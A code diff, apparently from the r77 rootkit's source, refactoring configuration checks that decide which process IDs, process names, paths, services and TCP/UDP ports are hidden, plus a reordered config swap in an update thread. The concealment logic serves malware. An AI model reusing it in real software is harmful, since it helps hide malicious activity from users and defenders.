@@ -22,37 +22,15 @@ void Config::Shutdown()
 
 bool Config::IsProcessIdHidden(DWORD processId)
 {
-	if (Configuration)
-	{
-		for (DWORD i = 0; i < Configuration->HiddenProcessIdCount; i++)
-		{
-			if (Configuration->HiddenProcessIds[i] == processId)
-			{
-				return true;
-			}
-		}
-	}
-
-	return false;
+	return Configuration && IntegerListContains(Configuration->HiddenProcessIds, processId);
 }
-bool Config::IsProcessNameHidden(LPCWSTR processName)
+bool Config::IsProcessNameHidden(LPCWSTR name)
 {
-	if (Configuration && processName)
-	{
-		for (DWORD i = 0; i < Configuration->HiddenProcessNameCount; i++)
-		{
-			if (!lstrcmpiW(Configuration->HiddenProcessNames[i], processName))
-			{
-				return true;
-			}
-		}
-	}
-
-	return false;
+	return Configuration && StringListContains(Configuration->HiddenProcessNames, name);
 }
-bool Config::IsProcessNameHidden(UNICODE_STRING processName)
+bool Config::IsProcessNameHidden(UNICODE_STRING name)
 {
-	PWCHAR chars = ConvertUnicodeStringToString(processName);
+	PWCHAR chars = ConvertUnicodeStringToString(name);
 	if (chars)
 	{
 		bool result = IsProcessNameHidden(chars);
@@ -66,78 +44,23 @@ bool Config::IsProcessNameHidden(UNICODE_STRING processName)
 }
 bool Config::IsPathHidden(LPCWSTR path)
 {
-	if (Configuration && path)
-	{
-		for (DWORD i = 0; i < Configuration->HiddenPathCount; i++)
-		{
-			if (!lstrcmpiW(Configuration->HiddenPaths[i], path))
-			{
-				return true;
-			}
-		}
-	}
-
-	return false;
+	return Configuration && StringListContains(Configuration->HiddenPaths, path);
 }
-bool Config::IsServiceNameHidden(LPCWSTR serviceName)
+bool Config::IsServiceNameHidden(LPCWSTR name)
 {
-	if (Configuration && serviceName)
-	{
-		for (DWORD i = 0; i < Configuration->HiddenServiceNameCount; i++)
-		{
-			if (!lstrcmpiW(Configuration->HiddenServiceNames[i], serviceName))
-			{
-				return true;
-			}
-		}
-	}
-
-	return false;
+	return Configuration && StringListContains(Configuration->HiddenServiceNames, name);
 }
 bool Config::IsTcpLocalPortHidden(USHORT port)
 {
-	if (Configuration)
-	{
-		for (DWORD i = 0; i < Configuration->HiddenTcpLocalPortCount; i++)
-		{
-			if (Configuration->HiddenTcpLocalPorts[i] == port)
-			{
-				return true;
-			}
-		}
-	}
-
-	return false;
+	return Configuration && IntegerListContains(Configuration->HiddenTcpLocalPorts, port);
 }
 bool Config::IsTcpRemotePortHidden(USHORT port)
 {
-	if (Configuration)
-	{
-		for (DWORD i = 0; i < Configuration->HiddenTcpRemotePortCount; i++)
-		{
-			if (Configuration->HiddenTcpRemotePorts[i] == port)
-			{
-				return true;
-			}
-		}
-	}
-
-	return false;
+	return Configuration && IntegerListContains(Configuration->HiddenTcpRemotePorts, port);
 }
 bool Config::IsUdpPortHidden(USHORT port)
 {
-	if (Configuration)
-	{
-		for (DWORD i = 0; i < Configuration->HiddenUdpPortCount; i++)
-		{
-			if (Configuration->HiddenUdpPorts[i] == port)
-			{
-				return true;
-			}
-		}
-	}
-
-	return false;
+	return Configuration && IntegerListContains(Configuration->HiddenUdpPorts, port);
 }
 
 DWORD WINAPI Config::UpdateThread(LPVOID parameter)
@@ -159,8 +82,9 @@ DWORD WINAPI Config::UpdateThread(LPVOID parameter)
 		else
 		{
 			// Store configuration only if it has changed to avoid threading errors.
-			DeleteR77Config(Configuration);
+			PR77_CONFIG oldConfiguration = Configuration;
 			Configuration = newConfiguration;
+			DeleteR77Config(oldConfiguration);
 		}
 	}
 
